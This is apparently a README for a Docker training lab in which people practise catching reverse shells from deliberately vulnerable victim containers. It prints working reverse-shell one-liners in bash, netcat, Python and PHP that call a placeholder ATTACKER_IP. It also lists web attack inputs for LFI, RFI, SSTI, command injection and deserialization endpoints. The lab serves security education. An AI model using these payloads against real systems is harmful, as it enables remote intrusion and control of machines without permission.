# Drakonix Reverse Shell Playground

> Educational environment for practicing manual reverse shell creation against various victim system configurations.

## ⚠️ Safety Notice

- **For**: CTF practice, pentest training, security education
- **Isolated**: Docker networks only - no external exposure
- **Never**: Expose ports to public internet or use against unauthorized systems

---

## Quick Start

```bash
# Clone and enter directory
cd DrakonixReverseShellPlayground

# Build and start all containers
docker-compose build
docker-compose up -d

# Get into attacker box
docker-compose exec attacker bash

# Start listeners (from attacker or host)
./scripts/listeners.sh start
```

---

## Victim Containers

| Container | Tools Available | Challenge |
|-----------|-----------------|-----------|
| `victim-busybox` | sh, busybox nc (no -e) | Minimal embedded device |
| `victim-alpine-bash` | bash, sh, busybox nc | Limited netcat |
| `victim-debian-minimal` | bash, sh | No netcat, no python |
| `victim-debian-full` | bash, nc, python3, perl | Standard Linux server |
| `victim-ubuntu-python` | bash, python2, python3 | No netcat - use Python |
| `victim-php-cli` | php, bash | PHP CLI only |
| `victim-php-apache` | php, apache, bash | Web-based shells (port 8080) |
| `victim-flask-ssti` | python, flask, jinja2 | SSTI exploitation (port 5000) |
| `victim-python-deser` | python, flask, pickle | Pickle deserialization (port 5001) |
| `victim-ruby-host` | ruby, bash, nc | Ruby reverse shells |
| `victim-ruby-deser` | ruby, sinatra, yaml | YAML deserialization (port 4567) |
| `victim-node-host` | node, bash, nc | Node.js reverse shells |
| `victim-java-host` | java, tomcat, nc | Java deserialization (port 8081) |
| `victim-mixed-tools` | Everything | Pick your tool |

---

## Usage Workflow

```bash
# 1. Start the playground
docker-compose up -d

# 2. Enter attacker box
docker-compose exec attacker bash

# 3. Find your IP (inside Docker network)
ip addr show eth0 | grep inet

# 4. Start listeners on multiple ports
./scripts/listeners.sh start
# Listens on: 4444, 5555, 6666, 7777, 8888, 9999

# 5. Open another terminal, enter a victim
docker exec -it drakonix-victim-busybox-1 sh

# 6. From victim, run reverse shell payloads
# See scripts/payload-cheatsheet.md for all payloads

# Example from busybox victim:
mkfifo /tmp/p; busybox nc 172.28.0.2 4444 0</tmp/p | sh > /tmp/p

# 7. Catch shell on attacker, upgrade TTY
python3 -c 'import pty;pty.spawn("/bin/bash")'

# 8. Stop everything when done
docker-compose down
```

---

## Quick Reference

### Get Attacker IP
```bash
# From inside attacker container
ip addr show eth0
# OR
hostname -I
```

### Common Reverse Shells

**Bash /dev/tcp:**
```bash
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
```

**Netcat (with -e):**
```bash
nc -e /bin/bash ATTACKER_IP 4444
```

**Python:**
```bash
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
```

**PHP:**
```bash
php -r '$sock=fsockopen("ATTACKER_IP",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

**Netcat pipe (no -e):**
```bash
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | nc ATTACKER_IP 4444 | /bin/sh > /tmp/f
```

---

## File Structure

```
DrakonixReverseShellPlayground/
├── docker-compose.yml      # All containers defined here
├── .env                    # Environment variables
├── PLAN.md                 # Detailed project plan
├── README.md               # This file
├── victims/                # Victim Dockerfiles
│   ├── Dockerfile.busybox
│   ├── Dockerfile.alpine-bash
│   ├── Dockerfile.debian-minimal
│   ├── Dockerfile.debian-full
│   ├── Dockerfile.ubuntu-python
│   ├── Dockerfile.php-cli
│   ├── Dockerfile.php-apache
│   ├── Dockerfile.ruby-host
│   ├── Dockerfile.node-host
│   ├── Dockerfile.java-host
│   └── Dockerfile.mixed-tools
└── scripts/
    ├── listeners.sh        # Start/stop multiple listeners
    └── payload-cheatsheet.md  # Complete payload reference
```

---

## Listener Commands

```bash
./scripts/listeners.sh start    # Start all listeners
./scripts/listeners.sh stop     # Stop all listeners
./scripts/listeners.sh status   # Show active listeners
./scripts/listeners.sh restart  # Restart listeners
```

---

## Web Vulnerability Endpoints

All web containers expose vulnerable endpoints on localhost ports. Access from host browser or attacker container.

### Quick Port Reference

| Port | Container | Vulnerabilities |
|------|-----------|------------------|
| **8080** | victim-php-apache | LFI, RFI, XXE, Command Exec, Eval |
| **5000** | victim-flask-ssti | Jinja2 SSTI |
| **5001** | victim-python-deser | Pickle Deserialization |
| **4567** | victim-ruby-deser | YAML Deserialization |
| **8081** | victim-java-host | Java Deserialization |

### PHP Apache (localhost:8080)

Access: `http://localhost:8080/vulnerable/` or `http://victim-php-apache/vulnerable/`

| Endpoint | Method | Vulnerability | Example |
|----------|--------|---------------|---------|
| `/vulnerable/index.html` | GET | Navigation page | Browse all vulnerabilities |
| `/vulnerable/exec.php` | GET `?cmd=` | Command Execution | `?cmd=whoami` |
| `/vulnerable/eval.php` | GET `?code=` | Eval Injection | `?code=system('id');` |
| `/vulnerable/lfi.php` | GET `?file=` | Local File Inclusion | `?file=../../../etc/passwd` |
| `/vulnerable/lfi-log.php` | GET + LFI | Log Poisoning | Poison UA, include log |
| `/vulnerable/rfi-raw.php` | GET `?url=` | Remote File Inclusion | `?url=http://attacker/shell.php` |
| `/vulnerable/xxe.php` | POST XML | XXE | Send XML with external entity |
| `/vulnerable/xxe-simple.php` | GET `?xml=` | XXE via SimpleXML | URL encode XML payload |

### Flask SSTI (localhost:5000)

Access: `http://localhost:5000/` or `http://victim-flask-ssti:5000/`

| Endpoint | Method | Vulnerability | Example |
|----------|--------|---------------|---------|
| `/` | GET | Index page | Browse vulnerabilities |
| `/ssti` | GET `?name=` | Jinja2 SSTI | `?name={{7*7}}` → 49 |
| `/render` | GET `?template=` | Direct template render | `?template={{config}}` |
| `/greeting` | GET `?user=` | SSTI in greeting | `?user={{config}}` |

### Python Pickle (localhost:5001)

Access: `http://localhost:5001/` or `http://victim-python-deser:5001/`

| Endpoint | Method | Vulnerability | Example |
|----------|--------|---------------|---------|
| `/` | GET | Index page + docs | Browse and generate payloads |
| `/pickle` | POST `data=` | Unsafe pickle.loads() | Base64 pickle payload |
| `/api/unpickle` | POST JSON | JSON API | `{"data": "base64..."}` |
| `/generate` | GET `?ip=&port=` | Payload generator | Generate reverse shell |

### Ruby YAML (localhost:4567)

Access: `http://localhost:4567/` or `http://victim-ruby-deser:4567/`

| Endpoint | Method | Vulnerability | Example |
|----------|--------|---------------|---------|
| `/` | GET | Index page + docs | Browse and generate payloads |
| `/yaml` | POST `yaml=` | YAML.unsafe_load() | YAML gadget payload |
| `/convert` | POST `json=` | JSON→YAML conversion | Vulnerable converter |
| `/generate` | GET `?ip=&port=` | Payload generator | Generate YAML gadget |

### Java Deserialization (localhost:8081)

Access: `http://localhost:8081/` or `http://victim-java-host:8081/`

| Endpoint | Method | Vulnerability | Example |
|----------|--------|---------------|---------|
| `/` | GET | Index page + docs | ysoserial guide |
| `/deserialize` | POST JSON | Unsafe ObjectInputStream | ysoserial payload |
| `/deserialize/form` | POST `data=` | Form-based deserialize | Base64 serialized object |
| `/test` | GET | Safe test object | Get test payload |
| `/generate` | GET `?ip=&port=` | Payload generator | ysoserial commands |

---

## PHP Apache Web Target

The `victim-php-apache` container runs Apache with vulnerable PHP endpoints:

The `victim-php-apache` container runs Apache with vulnerable PHP endpoints:

```bash
# From attacker container
curl http://victim-php-apache/vulnerable/exec.php?cmd=whoami

# Reverse shell via web endpoint:
curl "http://victim-php-apache/vulnerable/exec.php?cmd=bash+-c+'bash+-i+%3E%26+/dev/tcp/ATTACKER_IP/4444+0%3E%261'"
```

Available endpoints:
- `/vulnerable/exec.php` - Command execution via `?cmd=`
- `/vulnerable/eval.php` - Code execution via `?code=`
- `/vulnerable/info.php` - PHP info

---

## TTY Upgrade

After catching a basic shell, upgrade to interactive TTY:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# OR
script /dev/null
# Then: stty raw -echo; fg
```

---

## Complete Payload Reference

See `scripts/payload-cheatsheet.md` for:
- All reverse shell one-liners
- Victim-specific notes
- TTY upgrade techniques
- Base64 encoded payloads
- Troubleshooting tips

---

## Learning Challenges

1. **Busybox Challenge**: No bash, no /dev/tcp, nc has no -e
2. **Python-Only Challenge**: No netcat - must use Python socket
3. **PHP-Only Challenge**: Just PHP CLI - craft PHP socket shell
4. **Encoded Challenge**: Base64 encode payload to bypass filters
5. **Web Challenge**: Trigger reverse shell via vulnerable web endpoint

---

## Cleanup

```bash
# Stop and remove all containers
docker-compose down

# Remove built images too
docker-compose down --rmi all

# Clean up listener logs
rm -rf /tmp/drakonix_listeners
```

---

## License

MIT - Educational use only.
